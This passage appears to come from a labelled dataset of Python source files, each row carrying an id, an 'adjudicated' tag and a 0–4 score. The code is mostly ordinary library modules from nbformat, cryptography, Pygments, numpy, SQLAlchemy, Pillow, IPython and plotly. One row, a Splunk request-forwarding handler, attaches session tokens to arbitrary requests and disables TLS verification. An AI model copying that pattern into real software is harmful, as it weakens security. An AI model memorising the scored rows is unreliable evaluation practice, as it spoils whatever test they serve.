dti]<<NEWL>>    names = [""a"", ""b"", ""dti_1"", ""dti_2"", ""dti_3""]<<NEWL>>    return MultiIndex.from_arrays(levels, names=names)"
503	adjudicated	1	"import unittest<<NEWL>><<NEWL>>from nbformat import v4 as nbformat<<NEWL>><<NEWL>><<NEWL>>class NBClientTestsBase(unittest.TestCase):<<NEWL>>    def build_notebook(self, with_json_outputs=False):<<NEWL>>        """"""Build a notebook in memory for use with NotebookClient tests""""""<<NEWL>><<NEWL>>        outputs = [<<NEWL>>            nbformat.new_output(""stream"", name=""stdout"", text=""a""),<<NEWL>>            nbformat.new_output(""display_data"", data={'text/plain': 'b'}),<<NEWL>>            nbformat.new_output(""stream"", name=""stdout"", text=""c""),<<NEWL>>            nbformat.new_output(""stream"", name=""stdout"", text=""d""),<<NEWL>>            nbformat.new_output(""stream"", name=""stderr"", text=""e""),<<NEWL>>            nbformat.new_output(""stream"", name=""stderr"", text=""f""),<<NEWL>>            nbformat.new_output(""display_data"", data={'image/png': 'Zw=='}),  # g<<NEWL>>            nbformat.new_output(""display_data"", data={'application/pdf': 'aA=='}),  # h<<NEWL>>        ]<<NEWL>>        if with_json_outputs:<<NEWL>>            outputs.extend(<<NEWL>>                [<<NEWL>>                    nbformat.new_output(""display_data"", data={'application/json': [1, 2, 3]}),  # j<<NEWL>>                    nbformat.new_output(<<NEWL>>                        ""display_data"", data={'application/json': {'a': 1, 'c': {'b': 2}}}<<NEWL>>                    ),  # k<<NEWL>>                    nbformat.new_output(""display_data"", data={'application/json': 'abc'}),  # l<<NEWL>>                    nbformat.new_output(""display_data"", data={'application/json': 15.03}),  # m<<NEWL>>                ]<<NEWL>>            )<<NEWL>><<NEWL>>        cells = [<<NEWL>>            nbformat.new_code_cell(source=""$ e $"", execution_count=1, outputs=outputs),<<NEWL>>            nbformat.new_markdown_cell(source=""$ e $""),<<NEWL>>        ]<<NEWL>><<NEWL>>        return nbformat.new_notebook(cells=cells)<<NEWL>><<NEWL>>    def build_resources(self):<<NEWL>>        """"""Build an empty resources dictionary.""""""<<NEWL>>        return {'metadata': {}}<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def merge_dicts(cls, *dict_args):<<NEWL>>        # Because this is annoying to do inline<<NEWL>>        outcome = {}<<NEWL>>        for d in dict_args:<<NEWL>>            outcome.update(d)<<NEWL>>        return outcome"
443	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography.hazmat.primitives.asymmetric import dh<<NEWL>>from cryptography.hazmat.primitives.asymmetric.types import (<<NEWL>>    PRIVATE_KEY_TYPES,<<NEWL>>    PUBLIC_KEY_TYPES,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>def load_pem_private_key(<<NEWL>>    data: bytes,<<NEWL>>    password: typing.Optional[bytes],<<NEWL>>    backend: typing.Any = None,<<NEWL>>    *,<<NEWL>>    unsafe_skip_rsa_key_validation: bool = False,<<NEWL>>) -> PRIVATE_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_pem_private_key(<<NEWL>>        data, password, unsafe_skip_rsa_key_validation<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def load_pem_public_key(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> PUBLIC_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_pem_public_key(data)<<NEWL>><<NEWL>><<NEWL>>def load_pem_parameters(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> ""dh.DHParameters"":<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_pem_parameters(data)<<NEWL>><<NEWL>><<NEWL>>def load_der_private_key(<<NEWL>>    data: bytes,<<NEWL>>    password: typing.Optional[bytes],<<NEWL>>    backend: typing.Any = None,<<NEWL>>    *,<<NEWL>>    unsafe_skip_rsa_key_validation: bool = False,<<NEWL>>) -> PRIVATE_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_der_private_key(<<NEWL>>        data, password, unsafe_skip_rsa_key_validation<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def load_der_public_key(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> PUBLIC_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_der_public_key(data)<<NEWL>><<NEWL>><<NEWL>>def load_der_parameters(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> ""dh.DHParameters"":<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_der_parameters(data)"
484	adjudicated	1	"""""""<<NEWL>>views.py        # Houses `SchemaView`, `APIView` subclass.<<NEWL>><<NEWL>>See schemas.__init__.py for package overview.<<NEWL>>""""""<<NEWL>>from rest_framework import exceptions, renderers<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.schemas import coreapi<<NEWL>>from rest_framework.settings import api_settings<<NEWL>>from rest_framework.views import APIView<<NEWL>><<NEWL>><<NEWL>>class SchemaView(APIView):<<NEWL>>    _ignore_model_permissions = True<<NEWL>>    schema = None  # exclude from schema<<NEWL>>    renderer_classes = None<<NEWL>>    schema_generator = None<<NEWL>>    public = False<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        if self.renderer_classes is None:<<NEWL>>            if coreapi.is_enabled():<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.CoreAPIOpenAPIRenderer,<<NEWL>>                    renderers.CoreJSONRenderer,<<NEWL>>                ]<<NEWL>>            else:<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.OpenAPIRenderer,<<NEWL>>                    renderers.JSONOpenAPIRenderer,<<NEWL>>                ]<<NEWL>>            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:<<NEWL>>                self.renderer_classes += [renderers.BrowsableAPIRenderer]<<NEWL>><<NEWL>>    def get(self, request, *args, **kwargs):<<NEWL>>        schema = self.schema_generator.get_schema(request, self.public)<<NEWL>>        if schema is None:<<NEWL>>            raise exceptions.PermissionDenied()<<NEWL>>        return Response(schema)<<NEWL>><<NEWL>>    def handle_exception(self, exc):<<NEWL>>        # Schema renderers do not render exceptions, so re-perform content<<NEWL>>        # negotiation with default renderers.<<NEWL>>        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES<<NEWL>>        neg = self.perform_content_negotiation(self.request, force=True)<<NEWL>>        self.request.accepted_renderer, self.request.accepted_media_type = neg<<NEWL>>        return super().handle_exception(exc)"
477	adjudicated	3	"""""""<<NEWL>>    pygments.styles.autumn<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    A colorful style, inspired by the terminal highlighting style.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace<<NEWL>><<NEWL>><<NEWL>>class AutumnStyle(Style):<<NEWL>>    """"""<<NEWL>>    A colorful style, inspired by the terminal highlighting style.<<NEWL>>    """"""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Whitespace:                 '#bbbbbb',<<NEWL>><<NEWL>>        Comment:                    'italic #aaaaaa',<<NEWL>>        Comment.Preproc:            'noitalic #4c8317',<<NEWL>>        Comment.Special:            'italic #0000aa',<<NEWL>><<NEWL>>        Keyword:                    '#0000aa',<<NEWL>>        Keyword.Type:               '#00aaaa',<<NEWL>><<NEWL>>        Operator.Word:              '#0000aa',<<NEWL>><<NEWL>>        Name.Builtin:               '#00aaaa',<<NEWL>>        Name.Function:              '#00aa00',<<NEWL>>        Name.Class:                 'underline #00aa00',<<NEWL>>        Name.Namespace:             'underline #00aaaa',<<NEWL>>        Name.Variable:              '#aa0000',<<NEWL>>        Name.Constant:              '#aa0000',<<NEWL>>        Name.Entity:                'bold #800',<<NEWL>>        Name.Attribute:             '#1e90ff',<<NEWL>>        Name.Tag:                   'bold #1e90ff',<<NEWL>>        Name.Decorator:             '#888888',<<NEWL>><<NEWL>>        String:                     '#aa5500',<<NEWL>>        String.Symbol:              '#0000aa',<<NEWL>>        String.Regex:               '#009999',<<NEWL>><<NEWL>>        Number:                     '#009999',<<NEWL>><<NEWL>>        Generic.Heading:            'bold #000080',<<NEWL>>        Generic.Subheading:         'bold #800080',<<NEWL>>        Generic.Deleted:            '#aa0000',<<NEWL>>        Generic.Inserted:           '#00aa00',<<NEWL>>        Generic.Error:              '#aa0000',<<NEWL>>        Generic.Emph:               'italic',<<NEWL>>        Generic.Strong:             'bold',<<NEWL>>        Generic.Prompt:             '#555555',<<NEWL>>        Generic.Output:             '#888888',<<NEWL>>        Generic.Traceback:          '#aa0000',<<NEWL>><<NEWL>>        Error:                      '#F00 bg:#FAA'<<NEWL>>    }"
426	adjudicated	1	"""""""<<NEWL>>Aliases for functions which may be accelerated by Scipy.<<NEWL>><<NEWL>>Scipy_ can be built to use accelerated or otherwise improved libraries<<NEWL>>for FFTs, linear algebra, and special functions. This module allows<<NEWL>>developers to transparently support these accelerated functions when<<NEWL>>scipy is available but still support users who have only installed<<NEWL>>NumPy.<<NEWL>><<NEWL>>.. _Scipy : https://www.scipy.org<<NEWL>><<NEWL>>""""""<<NEWL>># This module should be used for functions both in numpy and scipy if<<NEWL>>#  you want to use the numpy version if available but the scipy version<<NEWL>>#  otherwise.<<NEWL>>#  Usage  --- from numpy.dual import fft, inv<<NEWL>><<NEWL>>__all__ = ['fft', 'ifft', 'fftn', 'ifftn', 'fft2', 'ifft2',<<NEWL>>           'norm', 'inv', 'svd', 'solve', 'det', 'eig', 'eigvals',<<NEWL>>           'eigh', 'eigvalsh', 'lstsq', 'pinv', 'cholesky', 'i0']<<NEWL>><<NEWL>>import numpy.linalg as linpkg<<NEWL>>import numpy.fft as fftpkg<<NEWL>>from numpy.lib import i0<<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>fft = fftpkg.fft<<NEWL>>ifft = fftpkg.ifft<<NEWL>>fftn = fftpkg.fftn<<NEWL>>ifftn = fftpkg.ifftn<<NEWL>>fft2 = fftpkg.fft2<<NEWL>>ifft2 = fftpkg.ifft2<<NEWL>><<NEWL>>norm = linpkg.norm<<NEWL>>inv = linpkg.inv<<NEWL>>svd = linpkg.svd<<NEWL>>solve = linpkg.solve<<NEWL>>det = linpkg.det<<NEWL>>eig = linpkg.eig<<NEWL>>eigvals = linpkg.eigvals<<NEWL>>eigh = linpkg.eigh<<NEWL>>eigvalsh = linpkg.eigvalsh<<NEWL>>lstsq = linpkg.lstsq<<NEWL>>pinv = linpkg.pinv<<NEWL>>cholesky = linpkg.cholesky<<NEWL>><<NEWL>>_restore_dict = {}<<NEWL>><<NEWL>>def register_func(name, func):<<NEWL>>    if name not in __all__:<<NEWL>>        raise ValueError(""{} not a dual function."".format(name))<<NEWL>>    f = sys._getframe(0).f_globals<<NEWL>>    _restore_dict[name] = f[name]<<NEWL>>    f[name] = func<<NEWL>><<NEWL>>def restore_func(name):<<NEWL>>    if name not in __all__:<<NEWL>>        raise ValueError(""{} not a dual function."".format(name))<<NEWL>>    try:<<NEWL>>        val = _restore_dict[name]<<NEWL>>    except KeyError:<<NEWL>>        return<<NEWL>>    else:<<NEWL>>        sys._getframe(0).f_globals[name] = val<<NEWL>><<NEWL>>def restore_all():<<NEWL>>    for name in _restore_dict.keys():<<NEWL>>        restore_func(name)"
368	adjudicated	0	"# mssql/__init__.py<<NEWL>># Copyright (C) 2005-2023 the SQLAlchemy authors and contributors<<NEWL>># <see AUTHORS file><<NEWL>>#<<NEWL>># This module is part of SQLAlchemy and is released under<<NEWL>># the MIT License: https://www.opensource.org/licenses/mit-license.php<<NEWL>># mypy: ignore-errors<<NEWL>><<NEWL>><<NEWL>>from . import base  # noqa<<NEWL>>from . import pymssql  # noqa<<NEWL>>from . import pyodbc  # noqa<<NEWL>>from .base import BIGINT<<NEWL>>from .base import BINARY<<NEWL>>from .base import BIT<<NEWL>>from .base import CHAR<<NEWL>>from .base import DATE<<NEWL>>from .base import DATETIME<<NEWL>>from .base import DATETIME2<<NEWL>>from .base import DATETIMEOFFSET<<NEWL>>from .base import DECIMAL<<NEWL>>from .base import FLOAT<<NEWL>>from .base import IMAGE<<NEWL>>from .base import INTEGER<<NEWL>>from .base import JSON<<NEWL>>from .base import MONEY<<NEWL>>from .base import NCHAR<<NEWL>>from .base import NTEXT<<NEWL>>from .base import NUMERIC<<NEWL>>from .base import NVARCHAR<<NEWL>>from .base import REAL<<NEWL>>from .base import ROWVERSION<<NEWL>>from .base import SMALLDATETIME<<NEWL>>from .base import SMALLINT<<NEWL>>from .base import SMALLMONEY<<NEWL>>from .base import SQL_VARIANT<<NEWL>>from .base import TEXT<<NEWL>>from .base import TIME<<NEWL>>from .base import TIMESTAMP<<NEWL>>from .base import TINYINT<<NEWL>>from .base import try_cast<<NEWL>>from .base import UNIQUEIDENTIFIER<<NEWL>>from .base import VARBINARY<<NEWL>>from .base import VARCHAR<<NEWL>>from .base import XML<<NEWL>><<NEWL>><<NEWL>>base.dialect = dialect = pyodbc.dialect<<NEWL>><<NEWL>><<NEWL>>__all__ = (<<NEWL>>    ""JSON"",<<NEWL>>    ""INTEGER"",<<NEWL>>    ""BIGINT"",<<NEWL>>    ""SMALLINT"",<<NEWL>>    ""TINYINT"",<<NEWL>>    ""VARCHAR"",<<NEWL>>    ""NVARCHAR"",<<NEWL>>    ""CHAR"",<<NEWL>>    ""NCHAR"",<<NEWL>>    ""TEXT"",<<NEWL>>    ""NTEXT"",<<NEWL>>    ""DECIMAL"",<<NEWL>>    ""NUMERIC"",<<NEWL>>    ""FLOAT"",<<NEWL>>    ""DATETIME"",<<NEWL>>    ""DATETIME2"",<<NEWL>>    ""DATETIMEOFFSET"",<<NEWL>>    ""DATE"",<<NEWL>>    ""TIME"",<<NEWL>>    ""SMALLDATETIME"",<<NEWL>>    ""BINARY"",<<NEWL>>    ""VARBINARY"",<<NEWL>>    ""BIT"",<<NEWL>>    ""REAL"",<<NEWL>>    ""IMAGE"",<<NEWL>>    ""TIMESTAMP"",<<NEWL>>    ""ROWVERSION"",<<NEWL>>    ""MONEY"",<<NEWL>>    ""SMALLMONEY"",<<NEWL>>    ""UNIQUEIDENTIFIER"",<<NEWL>>    ""SQL_VARIANT"",<<NEWL>>    ""XML"",<<NEWL>>    ""dialect"",<<NEWL>>    ""try_cast"",<<NEWL>>)"
228	adjudicated	1	"""""""<<NEWL>>    pygments.lexers.x10<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for the X10 programming language.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer<<NEWL>>from pygments.token import Text, Comment, Keyword, String<<NEWL>><<NEWL>>__all__ = ['X10Lexer']<<NEWL>><<NEWL>>class X10Lexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For the X10 language.<<NEWL>><<NEWL>>    .. versionadded:: 0.1<<NEWL>>    """"""<<NEWL>><<NEWL>>    name = 'X10'<<NEWL>>    url = 'http://x10-lang.org/'<<NEWL>>    aliases = ['x10', 'xten']<<NEWL>>    filenames = ['*.x10']<<NEWL>>    mimetypes = ['text/x-x10']<<NEWL>><<NEWL>>    keywords = (<<NEWL>>        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',<<NEWL>>        'break', 'case', 'catch', 'class', 'clocked', 'continue',<<NEWL>>        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',<<NEWL>>        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',<<NEWL>>        'instanceof', 'interface', 'isref', 'new', 'offer',<<NEWL>>        'operator', 'package', 'return', 'struct', 'switch', 'throw',<<NEWL>>        'try', 'type', 'val', 'var', 'when', 'while'<<NEWL>>    )<<NEWL>><<NEWL>>    types = (<<NEWL>>        'void'<<NEWL>>    )<<NEWL>><<NEWL>>    values = (<<NEWL>>        'false', 'null', 'self', 'super', 'this', 'true'<<NEWL>>    )<<NEWL>><<NEWL>>    modifiers = (<<NEWL>>        'abstract', 'extends', 'implements', 'native', 'offers',<<NEWL>>        'private', 'property', 'protected', 'public', 'static',<<NEWL>>        'throws', 'transient'<<NEWL>>    )<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'[^\S\n]+', Text),<<NEWL>>            (r'//.*?\n', Comment.Single),<<NEWL>>            (r'/\*(.|\n)*?\*/', Comment.Multiline),<<NEWL>>            (r'\b(%s)\b' % '|'.join(keywords), Keyword),<<NEWL>>            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),<<NEWL>>            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),<<NEWL>>            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),<<NEWL>>            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),<<NEWL>>            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),<<NEWL>>            (r'.', Text)<<NEWL>>        ],<<NEWL>>    }"
339	adjudicated	0	"from fontTools.misc.textTools import safeEval<<NEWL>>from . import DefaultTable<<NEWL>>import struct<<NEWL>><<NEWL>><<NEWL>>GASP_SYMMETRIC_GRIDFIT = 0x0004<<NEWL>>GASP_SYMMETRIC_SMOOTHING = 0x0008<<NEWL>>GASP_DOGRAY = 0x0002<<NEWL>>GASP_GRIDFIT = 0x0001<<NEWL>><<NEWL>><<NEWL>>class table__g_a_s_p(DefaultTable.DefaultTable):<<NEWL>>    def decompile(self, data, ttFont):<<NEWL>>        self.version, numRanges = struct.unpack("">HH"", data[:4])<<NEWL>>        assert 0 <= self.version <= 1, ""unknown 'gasp' format: %s"" % self.version<<NEWL>>        data = data[4:]<<NEWL>>        self.gaspRange = {}<<NEWL>>        for i in range(numRanges):<<NEWL>>            rangeMaxPPEM, rangeGaspBehavior = struct.unpack("">HH"", data[:4])<<NEWL>>            self.gaspRange[int(rangeMaxPPEM)] = int(rangeGaspBehavior)<<NEWL>>            data = data[4:]<<NEWL>>        assert not data, ""too much data""<<NEWL>><<NEWL>>    def compile(self, ttFont):<<NEWL>>        version = 0  # ignore self.version<<NEWL>>        numRanges = len(self.gaspRange)<<NEWL>>        data = b""""<<NEWL>>        items = sorted(self.gaspRange.items())<<NEWL>>        for rangeMaxPPEM, rangeGaspBehavior in items:<<NEWL>>            data = data + struct.pack("">HH"", rangeMaxPPEM, rangeGaspBehavior)<<NEWL>>            if rangeGaspBehavior & ~(GASP_GRIDFIT | GASP_DOGRAY):<<NEWL>>                version = 1<<NEWL>>        data = struct.pack("">HH"", version, numRanges) + data<<NEWL>>        return data<<NEWL>><<NEWL>>    def toXML(self, writer, ttFont):<<NEWL>>        items = sorted(self.gaspRange.items())<<NEWL>>        for rangeMaxPPEM, rangeGaspBehavior in items:<<NEWL>>            writer.simpletag(<<NEWL>>                ""gaspRange"",<<NEWL>>                [<<NEWL>>                    (""rangeMaxPPEM"", rangeMaxPPEM),<<NEWL>>                    (""rangeGaspBehavior"", rangeGaspBehavior),<<NEWL>>                ],<<NEWL>>            )<<NEWL>>            writer.newline()<<NEWL>><<NEWL>>    def fromXML(self, name, attrs, content, ttFont):<<NEWL>>        if name != ""gaspRange"":<<NEWL>>            return<<NEWL>>        if not hasattr(self, ""gaspRange""):<<NEWL>>            self.gaspRange = {}<<NEWL>>        self.gaspRange[safeEval(attrs[""rangeMaxPPEM""])] = safeEval(<<NEWL>>            attrs[""rangeGaspBehavior""]<<NEWL>>        )"
279	adjudicated	4	"""""""Pillow (Fork of the Python Imaging Library)<<NEWL>><<NEWL>>Pillow is the friendly PIL fork by Alex Clark and Contributors.<<NEWL>>    https://github.com/python-pillow/Pillow/<<NEWL>><<NEWL>>Pillow is forked from PIL 1.1.7.<<NEWL>><<NEWL>>PIL is the Python Imaging Library by Fredrik Lundh and Contributors.<<NEWL>>Copyright (c) 1999 by Secret Labs AB.<<NEWL>><<NEWL>>Use PIL.__version__ for this Pillow version.<<NEWL>><<NEWL>>;-)<<NEWL>>""""""<<NEWL>><<NEWL>>from . import _version<<NEWL>><<NEWL>># VERSION was removed in Pillow 6.0.0.<<NEWL>># PILLOW_VERSION was removed in Pillow 9.0.0.<<NEWL>># Use __version__ instead.<<NEWL>>__version__ = _version.__version__<<NEWL>>del _version<<NEWL>><<NEWL>><<NEWL>>_plugins = [<<NEWL>>    ""BlpImagePlugin"",<<NEWL>>    ""BmpImagePlugin"",<<NEWL>>    ""BufrStubImagePlugin"",<<NEWL>>    ""CurImagePlugin"",<<NEWL>>    ""DcxImagePlugin"",<<NEWL>>    ""DdsImagePlugin"",<<NEWL>>    ""EpsImagePlugin"",<<NEWL>>    ""FitsImagePlugin"",<<NEWL>>    ""FitsStubImagePlugin"",<<NEWL>>    ""FliImagePlugin"",<<NEWL>>    ""FpxImagePlugin"",<<NEWL>>    ""FtexImagePlugin"",<<NEWL>>    ""GbrImagePlugin"",<<NEWL>>    ""GifImagePlugin"",<<NEWL>>    ""GribStubImagePlugin"",<<NEWL>>    ""Hdf5StubImagePlugin"",<<NEWL>>    ""IcnsImagePlugin"",<<NEWL>>    ""IcoImagePlugin"",<<NEWL>>    ""ImImagePlugin"",<<NEWL>>    ""ImtImagePlugin"",<<NEWL>>    ""IptcImagePlugin"",<<NEWL>>    ""JpegImagePlugin"",<<NEWL>>    ""Jpeg2KImagePlugin"",<<NEWL>>    ""McIdasImagePlugin"",<<NEWL>>    ""MicImagePlugin"",<<NEWL>>    ""MpegImagePlugin"",<<NEWL>>    ""MpoImagePlugin"",<<NEWL>>    ""MspImagePlugin"",<<NEWL>>    ""PalmImagePlugin"",<<NEWL>>    ""PcdImagePlugin"",<<NEWL>>    ""PcxImagePlugin"",<<NEWL>>    ""PdfImagePlugin"",<<NEWL>>    ""PixarImagePlugin"",<<NEWL>>    ""PngImagePlugin"",<<NEWL>>    ""PpmImagePlugin"",<<NEWL>>    ""PsdImagePlugin"",<<NEWL>>    ""SgiImagePlugin"",<<NEWL>>    ""SpiderImagePlugin"",<<NEWL>>    ""SunImagePlugin"",<<NEWL>>    ""TgaImagePlugin"",<<NEWL>>    ""TiffImagePlugin"",<<NEWL>>    ""WebPImagePlugin"",<<NEWL>>    ""WmfImagePlugin"",<<NEWL>>    ""XbmImagePlugin"",<<NEWL>>    ""XpmImagePlugin"",<<NEWL>>    ""XVThumbImagePlugin"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>class UnidentifiedImageError(OSError):<<NEWL>>    """"""<<NEWL>>    Raised in :py:meth:`PIL.Image.open` if an image cannot be opened and identified.<<NEWL>>    """"""<<NEWL>><<NEWL>>    pass"
269	adjudicated	3	"# -*- coding: utf-8 -*-<<NEWL>>""""""Payload system for IPython.<<NEWL>><<NEWL>>Authors:<<NEWL>><<NEWL>>* Fernando Perez<<NEWL>>* Brian Granger<<NEWL>>""""""<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>>#       Copyright (C) 2008-2011 The IPython Development Team<<NEWL>>#<<NEWL>>#  Distributed under the terms of the BSD License.  The full license is in<<NEWL>>#  the file COPYING, distributed as part of this software.<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Imports<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>from traitlets.config.configurable import Configurable<<NEWL>>from traitlets import List<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Main payload class<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>class PayloadManager(Configurable):<<NEWL>><<NEWL>>    _payload = List([])<<NEWL>><<NEWL>>    def write_payload(self, data, single=True):<<NEWL>>        """"""Include or update the specified `data` payload in the PayloadManager.<<NEWL>><<NEWL>>        If a previous payload with the same source exists and `single` is True,<<NEWL>>        it will be overwritten with the new one.<<NEWL>>        """"""<<NEWL>><<NEWL>>        if not isinstance(data, dict):<<NEWL>>            raise TypeError('Each payload write must be a dict, got: %r' % data)<<NEWL>><<NEWL>>        if single and 'source' in data:<<NEWL>>            source = data['source']<<NEWL>>            for i, pl in enumerate(self._payload):<<NEWL>>                if 'source' in pl and pl['source'] == source:<<NEWL>>                    self._payload[i] = data<<NEWL>>                    return<<NEWL>><<NEWL>>        self._payload.append(data)<<NEWL>><<NEWL>>    def read_payload(self):<<NEWL>>        return self._payload<<NEWL>><<NEWL>>    def clear_payload(self):<<NEWL>>        self._payload = []"
329	adjudicated	1	"from splunk.persistconn.application import PersistentServerConnectionApplication<<NEWL>>import json<<NEWL>>import requests<<NEWL>>import logging<<NEWL>><<NEWL>><<NEWL>>class request(PersistentServerConnectionApplication):<<NEWL>>    def __init__(self, command_line, command_arg, logger=None):<<NEWL>>        super(PersistentServerConnectionApplication, self).__init__()<<NEWL>>        self.logger = logger<<NEWL>>        if self.logger == None:<<NEWL>>            self.logger = logging.getLogger(f""splunk.appserver.badmsc"")<<NEWL>><<NEWL>>        PersistentServerConnectionApplication.__init__(self)<<NEWL>><<NEWL>>    def handle(self, in_string):<<NEWL>>        args = json.loads(in_string)<<NEWL>><<NEWL>>        if args[""method""] != ""POST"":<<NEWL>>            self.logger.info(f""Method {args['method']} not allowed"")<<NEWL>>            return {<<NEWL>>                ""payload"": ""Method Not Allowed"",<<NEWL>>                ""status"": 405,<<NEWL>>                ""headers"": {""Allow"": ""POST""},<<NEWL>>            }<<NEWL>><<NEWL>>        try:<<NEWL>>            options = json.loads(args[""payload""])<<NEWL>>        except Exception as e:<<NEWL>>            self.logger.info(f""Invalid payload. {e}"")<<NEWL>>            return {""payload"": ""Invalid JSON payload"", ""status"": 400}<<NEWL>><<NEWL>>        self.logger.info(args[""payload""])<<NEWL>><<NEWL>>        # Handle local requests by adding FQDN and auth token<<NEWL>>        if options[""url""].startswith(""/services""):<<NEWL>>            options[""verify""] = False<<NEWL>>            options[""url""] = f""{args['server']['rest_uri']}{options['url']}""<<NEWL>>            options[""headers""][<<NEWL>>                ""Authorization""<<NEWL>>            ] = f""Splunk {args['session']['authtoken']}""<<NEWL>>        elif not (<<NEWL>>            options[""url""].startswith(""https://"")<<NEWL>>            or options[""url""].startswith(""http://"")<<NEWL>>        ):<<NEWL>>            options[""url""] = f""https://{options['url']}""<<NEWL>><<NEWL>>        try:<<NEWL>>            r = requests.request(**options)<<NEWL>>            self.logger.info(f""{r.status_code} {r.text}"")<<NEWL>>            return {""payload"": r.text, ""status"": r.status_code}<<NEWL>>        except Exception as e:<<NEWL>>            self.logger.info(f""Request failed. {e}"")<<NEWL>>            return {""payload"": str(e), ""status"": 500}"
238	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""scatterpolargl"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
